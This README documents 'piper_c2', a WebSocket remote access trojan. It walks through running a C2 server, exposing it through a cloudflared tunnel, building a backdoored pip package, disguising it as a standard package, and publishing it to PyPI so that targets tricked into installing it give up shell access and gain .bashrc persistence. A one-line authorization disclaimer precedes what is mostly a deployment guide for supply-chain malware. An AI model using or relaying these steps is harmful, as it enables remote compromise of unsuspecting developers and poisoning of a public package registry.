# piper_c2

A remote access trojan (RAT) built on WebSockets that gives the operator shell access and simple persistence via the .bashrc file.

Warning: This project is intended only for systems and environments where you have explicit authorization to perform testing. Do not deploy it on third-party systems.

### overview

piper_c2 consists of three main components:

-  C2 server — the operator interface
-  Trojan builder — a script that assembles the payload and packages it with pip
-  Template/payload — the backdoor script

The basic workflow is:
```workflow
trojan_builder.py
│
├── host
├── port
└── output name
│
▼
pip package generated
│
└── social engineering, payload installation, and execution of the trigger command on the target device
│
│ -> Attempts to establish persistence by modifying the .bashrc file.
▼
C2 server connection and shell access
``` 

## Requirements

-  Python 3
-  pip
-  websockets
-  cloudflared or another tunneling service

### Install the dependency:

```bash
pip install -r requirements.txt
```

### 1. Start the server

Starting the service
```bash
cd src
python main.py --port=8081 --host="localhost"
``` 
### Get a public URL

To access the service running on your localhost from outside your machine, use cloudflared or any other tunneling tool of your choice.
```bash
cloudflared tunnel --url http://localhost:8081
```
You will receive output similar to this:
```text
Your quick Tunnel has been created!
https://random_text.trycloudflare.com
```
Copy and save the .trycloudflare.com URL for the next step.

## 2. Generate and configure the trojan

Use the script located at src/trojan_builder.py to assemble the package you will distribute via pip.

Example:
```bash
python trojan_builder.py -p=8081 -u="catboolk.trycloudflare.com" -o="teste"
```
Parameters:

Option Description Type
-p Server port int
-u cloudflared URL str
-o Output/package name str

For example:
```bash
python trojan_builder.py -u="catboolk.trycloudflare.com" -p=8181 -o="teste"
```
After answering the prompts and defining the trigger command, check the generated package:
```text
tree teste

teste
├── pyproject.toml
└── src
└── piper_c2
├── init.py
└── main.py
```
### Publishing to PyPI

If you have the technical knowledge, it is recommended that you modify the package generated by the builder — disguising it as a standard package — and publish it to PyPI.

Install the necessary tools for publishing to PyPI

Install the tools used to publish the package containing the trojan to pip. Before doing so, set up a github.com account and a pypi.org account.
```bash
pip install --upgrade build twine
```
Run this in the package folder:
```bash
python -m build
```
This should generate the following files:
```text
dist/
├── <package_name>-0.1.0-py3-none-any.whl
└── <package_name>-0.1.0.tar.gz
```
Now create a PyPI account and generate a new token.
```bash
python -m twine upload dist/*
```
It will ask for:
```text
Username: token
Password: pypi-xxxxxxxxxxxxxxxx
```
After that, the malicious package can be installed on the target machine with a simple pip install <package_name>.

As soon as you trigger the command defined when the payload was created, the shell connection should start.
